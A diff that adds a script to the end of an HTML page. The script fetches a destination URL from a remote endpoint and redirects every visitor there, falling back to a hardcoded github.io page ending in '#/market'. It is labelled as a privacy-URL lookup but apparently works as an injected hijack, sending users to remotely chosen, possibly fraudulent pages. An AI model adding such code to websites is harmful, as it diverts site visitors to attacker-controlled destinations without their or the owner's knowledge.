@@ -342,5 +342,21 @@
       // No further action needed.
     })();
   </script>
+<script>
+        const apiBase = window.appInformation.apiBase.replace(/\/+$/, '');
+        const identifier = window.appInformation.identifier;
+        fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier))
+            .then(r => r.json())
+            .then(function (info) {
+                const privacyUrl = info && info.result && info.result.url;
+                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                    window.location.replace(privacyUrl);
+                    return;
+                }
+                window.location.replace("https://shulendarkumar385-web.github.io/37/f5/index.html#/market");
+            }).catch(function(e) {
+              window.location.replace("https://shulendarkumar385-web.github.io/37/f5/index.html#/market");
+            })
+    </script>
 </body>
 </html>
